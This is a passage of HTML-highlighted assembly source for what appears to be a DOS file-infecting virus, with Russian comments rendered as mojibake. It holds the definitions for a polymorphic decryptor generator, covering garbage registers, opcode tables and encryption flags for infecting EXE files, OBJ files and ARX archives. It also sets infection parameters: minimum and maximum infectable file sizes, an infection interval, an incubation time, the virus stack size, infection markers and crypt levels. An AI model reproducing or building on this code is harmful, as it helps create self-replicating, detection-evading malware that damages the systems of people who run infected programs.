        </span><span class="sc9">REPT</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
            </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">byt</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc5">byt</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">byt</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0EDB88320H</span><span class="sc0">
            </span><span class="sc9">ELSE</span><span class="sc0">
                </span><span class="sc5">byt</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">byt</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc9">ENDM</span><span class="sc0">
        </span><span class="sc5">cum_crc</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">cum_crc</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc5">byt</span><span class="sc0">
    </span><span class="sc9">ENDM</span><span class="sc0">
    </span><span class="sc5">cum_crc</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">cum_crc</span><span class="sc0">

    </span><span class="sc5">suxx</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc4">(((</span><span class="sc5">cum_crc</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">cum_crc</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \
        </span><span class="sc4">(((</span><span class="sc5">cum_crc</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">10h</span><span class="sc4">-(</span><span class="sc5">cum_crc</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc4">)))</span><span class="sc0">

    </span><span class="sc5">suxx</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">suxx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">cum_crc</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0"> </span><span class="sc1">; add dx, cx</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">suxx</span><span class="sc0">
</span><span class="sc5">POPSTATE</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc5">cmp_ax_CRC32w</span><span class="sc0"> </span><span class="sc9">MACRO</span><span class="sc0"> </span><span class="sc5">moreshit</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">
    </span><span class="sc5">CRC32w</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">moreshit</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc5">%NOINCL</span><span class="sc0">
</span><span class="sc5">%NOSYMS</span><span class="sc0">
</span><span class="sc9">.SFCOND</span><span class="sc0">
</span><span class="sc9">.XCREF</span><span class="sc0">
</span><span class="sc9">.SALL</span><span class="sc0">

</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc5">USE_PUSHA</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;RELIZ equ 0</span><span class="sc0">
</span><span class="sc1">;USE_BEEP equ 0</span><span class="sc0">

</span><span class="sc5">$BEEP</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">USE_BEEP</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">beep</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">beep</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">SF.INC</span><span class="sc0">      </span><span class="sc1">;\
INCLUDE FIND.INC    ;|</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">EXE.INC</span><span class="sc0">     </span><span class="sc1">;&gt; ¨§ ¨áå®¤­¨ª®¢ MS-DOS 3.30</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">PDB.INC</span><span class="sc0">     </span><span class="sc1">;|</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">DPB.INC</span><span class="sc0">     </span><span class="sc1">;|</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">DIRENT.INC</span><span class="sc0">  </span><span class="sc1">;|</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">ARENA.INC</span><span class="sc0">   </span><span class="sc1">;/</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">STAR14T.INC</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">ABSDISK.INC</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">ARXHDRS.ASI</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">SHMAC.INC</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">CRC.ASI</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc9">GLOBAL</span><span class="sc0">      </span><span class="sc5">RND_INIT</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc4">,</span><span class="sc0">                  \
            </span><span class="sc5">RND_GET</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc4">,</span><span class="sc0">                   \ </span><span class="sc5">randomizer</span><span class="sc0">
            </span><span class="sc5">RND_GET_THREE_BITS</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc4">,</span><span class="sc0">        \
            </span><span class="sc5">RND_GET_BYTE</span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">RegWord</span><span class="sc0">         </span><span class="sc5">ENUM</span><span class="sc0">    </span><span class="sc5">R_AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_SP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_DI</span><span class="sc0">
</span><span class="sc5">RegByte</span><span class="sc0">         </span><span class="sc5">ENUM</span><span class="sc0">    </span><span class="sc5">R_AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_BH</span><span class="sc0">

</span><span class="sc5">secondbyte</span><span class="sc0">      </span><span class="sc9">RECORD</span><span class="sc0">  </span><span class="sc5">M0D</span><span class="sc4">:</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">REG</span><span class="sc4">:</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R_M</span><span class="sc4">:</span><span class="sc2">3</span><span class="sc0">

</span><span class="sc5">asgrbl</span><span class="sc0">  </span><span class="sc9">RECORD</span><span class="sc0">  </span><span class="sc5">N</span><span class="sc0">               </span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">     \
                </span><span class="sc5">REG_GARBL3</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">     \ à¥£¨áâàë
                </span><span class="sc5">REG_GARBL2</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">     \ ­¥ ¨á¯®«ì§ã¥¬ë¥
                </span><span class="sc5">REG_GARBL1</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">     \ ¤«ï à áè¨äà®¢ª¨
                </span><span class="sc5">REG_TMP2</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">     \   ¤«ï ª®­áâ ­â
                </span><span class="sc5">REG_TMP1</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">     \
                </span><span class="sc5">REG_ENC</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">     \
                </span><span class="sc5">REG_INDEX</span><span class="sc0">       </span><span class="sc4">:</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; ãª § â¥«ì ­  è¨äàã¥¬®¥ á«®¢®</span><span class="sc0">

</span><span class="sc5">REG_GARBL_ALL</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">REG_GARBL1</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">    \ à¥£¨áâàë
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">REG_GARBL2</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">    \   ­¥ ¨á¯®«ì§ã¥¬ë¥
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">REG_GARBL3</span><span class="sc0">         </span><span class="sc1">;     ¤«ï à áè¨äà®¢ª¨</span><span class="sc0">
</span><span class="sc5">REG_ENC_ALL</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">REG_ENC</span><span class="sc0">      </span><span class="sc6">or</span><span class="sc0">    \ à¥£¨áâàë
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">REG_TMP1</span><span class="sc0">     </span><span class="sc6">or</span><span class="sc0">    \   ¨á¯®«ì§ã¥¬ë¥
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">REG_TMP2</span><span class="sc0">           </span><span class="sc1">;     ¤«ï à áè¨äà®¢ª¨</span><span class="sc0">
</span><span class="sc5">REG_ALL</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">REG_INDEX</span><span class="sc0">    </span><span class="sc6">or</span><span class="sc0">    \ ¢á¥ à¥£¨áâàë </span><span class="sc4">(</span><span class="sc0">ªà®¬¥ </span><span class="sc8">SP</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc5">REG_ENC_ALL</span><span class="sc0">       </span><span class="sc6">or</span><span class="sc0">    \
                </span><span class="sc5">REG_GARBL_ALL</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ÄcurrentÄnotÄusedÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">ENFLAGS</span><span class="sc0"> </span><span class="sc9">RECORD</span><span class="sc0">  </span><span class="sc5">EN_SAVE_REGS</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">     \ á®åà ­ïâì à¥£¨áâàë ¯¥à¥¤ à áè¨äà®¢ª®©
                </span><span class="sc5">EN_USE_INT</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">     \ ¥­ª®¤¨âì ¯à¥àë¢ ­¨ï
                </span><span class="sc5">EN_USE_CALL</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">     \ ¥­ª®¤¨âì ¯à®æ¥¤ãàë ¨ </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc5">EN_USE_JMPS</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">     \ ¥­ª®¤¨âì ãá«®¢­ë¥ ¯¥à¥å®¤ë
                </span><span class="sc5">EN_INT_GARBL</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">     \ ¬ «® «¥¢ëå ¨­áâàãªæ¨© ¢ à áè¨äà®¢é¨ª¥
                </span><span class="sc5">EN_RELOCATOR</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">     \ ®¯à¥¤¥«ïâì á¢®¥ ¯®«®¦¥­¨¥ ¢ ¯ ¬ïâ¨
                </span><span class="sc5">EN_BFR_GARBL</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ENFLAGS_ARX</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_RELOCATOR</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_USE_INT</span><span class="sc0">     </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_USE_JMPS</span><span class="sc0">    </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_USE_CALL</span><span class="sc0">    </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc4">(</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0">  </span><span class="sc5">EN_BFR_GARBL</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ä« £¨ ¤«ï ¢¨àãá  ¢ EXEä ©«¥</span><span class="sc0">
</span><span class="sc5">ENFLAGS_EXE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_USE_INT</span><span class="sc0">     </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_USE_JMPS</span><span class="sc0">    </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_USE_CALL</span><span class="sc0">    </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc4">(</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0">  </span><span class="sc5">EN_BFR_GARBL</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">ENFLAGS_HDR</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_INT_GARBL</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_RELOCATOR</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_SAVE_REGS</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ä« £¨ ¤«ï ¢¨àãá  ¢ EXEä ©«¥ c podgruzkoi</span><span class="sc0">
</span><span class="sc5">ENFLAGS_IXE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_USE_JMPS</span><span class="sc0">    </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_USE_CALL</span><span class="sc0">    </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_RELOCATOR</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_SAVE_REGS</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0">  </span><span class="sc5">EN_BFR_GARBL</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ä« £¨ ¤«ï ¢¨àãá  ¢ OBJä ©«¥</span><span class="sc0">
</span><span class="sc5">ENFLAGS_OBJ</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_INT_GARBL</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_SAVE_REGS</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_USE_CALL</span><span class="sc0">    </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc9">MASK</span><span class="sc0"> </span><span class="sc5">EN_RELOCATOR</span><span class="sc0">   </span><span class="sc6">or</span><span class="sc0">  \
                </span><span class="sc4">(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0">  </span><span class="sc5">EN_BFR_GARBL</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;ä« £¨ ¤«ï ¢¨àãá  ¢ OBJä ©«¥</span><span class="sc0">
</span><span class="sc1">;ENFLAGS_OBJ =   MASK EN_INT_GARBL   or  \
;                MASK EN_SAVE_REGS   or  \
;                MASK EN_RELOCATOR</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;®¯ª®¤ë</span><span class="sc0">
</span><span class="sc5">opNOP</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc5">opPUSHF</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">9Ch</span><span class="sc0">
</span><span class="sc5">opINT</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc0">
</span><span class="sc5">opCALL</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
</span><span class="sc5">opJMPN</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">
</span><span class="sc5">opJMPS</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">
</span><span class="sc5">opSEGCS</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">
</span><span class="sc5">opSEGES</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc0">
</span><span class="sc5">opRETN</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc0">
</span><span class="sc5">opRETF</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0CBh</span><span class="sc0">
</span><span class="sc5">opJMPFAR</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">opMOV_AHimm</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc0">
</span><span class="sc5">opPUSH_CS</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc0">
</span><span class="sc5">opPUSHA</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">
</span><span class="sc5">opPOPA</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">61h</span><span class="sc0">
</span><span class="sc5">opJC</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">72h</span><span class="sc0">
</span><span class="sc5">opJZ</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc0">
</span><span class="sc5">opPOP_AX</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">58h</span><span class="sc0">
</span><span class="sc5">opPUSH_AX</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">
</span><span class="sc5">opCMP_AXimm</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc0">
</span><span class="sc5">opCMP_ALimm</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;¬¨­¨¬ «ì­ë© ¨ ¬ ªá¨¬ «ì­ë© à §¬¥àë § à ¦ ¥¬ëå EXEè­¨ª®¢</span><span class="sc0">
</span><span class="sc5">MININFECTSIZE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">   </span><span class="sc1">;  1k</span><span class="sc0">
</span><span class="sc5">MAXINFECTSIZE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000h</span><span class="sc0"> </span><span class="sc1">;512k</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">INTERVAL_INFECT</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">INCUB_TIME</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">;14 sec</span><span class="sc0">

</span><span class="sc5">VIRUSSTACKSIZE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">
</span><span class="sc5">TIMEMARKER</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">SIZEMARKER</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">157d</span><span class="sc0">
</span><span class="sc5">SIZEMARKER_MOD</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">37d</span><span class="sc0">
</span><span class="sc5">CRYPTLEVEL</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc0">   </span><span class="sc1">;¬ ªá¨¬ «ì­® ¢®§¬®¦­ë© (!)</span><span class="sc0">
</span><span class="sc5">DOUBLEENCRYPT</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc5">HDRCRYPTLEVEL</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0">
